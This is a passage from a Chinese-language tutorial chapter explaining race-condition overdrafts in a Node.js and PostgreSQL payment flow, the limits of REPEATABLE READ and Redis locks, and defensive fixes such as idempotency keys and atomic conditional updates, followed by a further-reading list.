   - Node.js 的 JavaScript 主執行緒確實不會在同一瞬間跑兩行同步程式碼；但後端扣款不可能是純記憶體同步運算，只要在「讀取餘額檢查」與「寫入扣款變更」中間夾了任何一個非同步 I/O 操作（比如 `await db.query(...)`、`await redis.get(...)` 或呼叫外部風控 API），事件迴圈在等待 I/O 回應的空檔就會立刻把執行權交給其他已經抵達的併發請求。
   - 於是後面 `19` 筆請求就能趁第 1 筆請求還在等資料庫或外部 API 回應時，輪流進來跑完各自的 `SELECT` 讀取階段，大家手裡拿的都是還沒扣款的 `10,000` 分舊餘額，最後再排隊把餘額一路扣成負數。
2. **調成 `REPEATABLE READ` 的真實反應與死角**：
   - **對單一帳戶單列扣款有效**：在 `REPEATABLE READ` 下，交易內第一條查詢拍下快照後，只要第 1 筆交易成功 `UPDATE` 該列並提交，後面 `19` 筆拿著舊快照也想 `UPDATE` 同一列的併發交易，在列鎖釋放後就會立刻收到 PostgreSQL 的 `40001` 序列化失敗錯誤（`could not serialize access due to concurrent update`）並被強制回滾，因此不會發生單列透支（但應用層必須正確接住 `40001` 報錯，千萬不能寫成無腦重試扣款）。
   - **擋不住跨多列的寫偏斜（Write Skew）**：如果業務規則是「主帳戶 A 與副帳戶 B 的餘額總和不得小於 `0`」，當兩筆併發交易都先讀了 A 與 B 確認總和夠扣，接著一筆只 `UPDATE` A 列、另一筆只 `UPDATE` B 列時，因為修改的是不同列，`REPEATABLE READ` 完全不會報錯，兩筆交易都會成功提交並把總和扣成負數。遇到跨多列不變量，必須升級到 `SERIALIZABLE`（SSI），或是在 `READ COMMITTED` 下先用 `SELECT ... FOR UPDATE` 鎖定共用的父列（也可以在 `REPEATABLE READ` 下強迫對共用父列做一次實際的版本號更新來觸發寫入衝突）。
3. **Redis `SET NX` + 無條件 `DEL` 的兩個致命破口**：
   - 第一是**無條件 `DEL` 會誤刪別人的鎖**：如果請求 A 因為下游卡頓跑了超過 `5,000 ms`，Redis 會自動把鎖過期釋放並交給請求 B；等 A 終於跑完跳進 `finally` 執行 `DEL lock:acc:42` 時，刪掉的其實是 B 正在持有的鎖，讓外面的請求 C 也能同時闖進臨界區。正確做法是改用 Redis Lua 腳本，原子比對 `GET` 出來的 `<uuid>` 跟自己手上的相符才准 `DEL`。
   - 第二是**缺少儲存層 Fencing Token（柵欄憑證）**：就算改用 Lua 安全刪鎖，那個卡頓超過 `5,000 ms` 才醒過來的請求 A，手裡拿的還是舊狀態，照樣能把過期的扣款指令送進資料庫。Redis 鎖只是協調提示，最終寫入資料庫時還是得靠遞增的 Fencing Token 檢查，或是直接用資料庫自身的條件更新與列鎖當作最終防線。
4. **不靠 Redis 鎖的安全提領契約三要素**：
   - **嚴格的輸入數值邊界**：所有金額一律採用整數分（Integer Cents），在 API 入口強制檢查 `Number.isSafeInteger(amount) && amount > 0 && amount <= 10000`，杜絕浮點數誤差與負數加款。
   - **唯一冪等鍵搶佔與參數綁定**：規定客戶端必須帶上 `Idempotency-Key`，並在資料庫建立 `(account_id, idem_key)` 的 `UNIQUE` 唯一約束（同時記錄請求參數雜湊與處理狀態）；在同一個資料庫交易開頭先用 `INSERT ... ON CONFLICT DO NOTHING` 搶佔執行權，同鍵重送且參數相同時直接回傳上次結果，參數不同或正在處理中則直接拒絕。
   - **單條原子條件更新與出金狀態持久化**：把餘額檢查直接寫進扣款語句 `UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1`，嚴格以 `rowCount === 1` 且交易成功提交作為扣款成功的唯一標準；若需呼叫外部銀行出金，則將出金狀態持久化在資料庫內，憑唯一的冪等憑證與外部金流做非同步確認與定期對帳。

---

## 延伸閱讀

- James Kettle（PortSwigger Research）, *Smashing the state machine: the true potential of web race conditions*（Black Hat USA / DEF CON 2023）：HTTP/2 Single-Packet Attack 的原創經典研究，詳細拆解 `last-byte sync` 為什麼能把跨洲網路的到達抖動壓進 `< 1 ms`。
- PortSwigger Web Security Academy, *Race conditions* 與 *Business logic vulnerabilities* 實驗室系列：對應本章所有單封包併發測試與多步驟工作流跳步的線上實戰靶場。
- PostgreSQL 16 官方文件, *Chapter 13. Concurrency Control（Transaction Isolation / Explicit Locking）*：徹底搞懂 `READ COMMITTED` 在列鎖釋放後的重讀行為、寫偏斜成因，以及 `SERIALIZABLE`（SSI）的衝突偵測機制。
- Martin Kleppmann, *How to do distributed locking*（與 Redis 作者 Antirez 的經典 Redlock 論戰）：深入剖析為什麼光靠帶有 TTL 的分散式鎖永遠無法保證絕對互斥，以及為什麼儲存層必須搭配 Fencing Token。
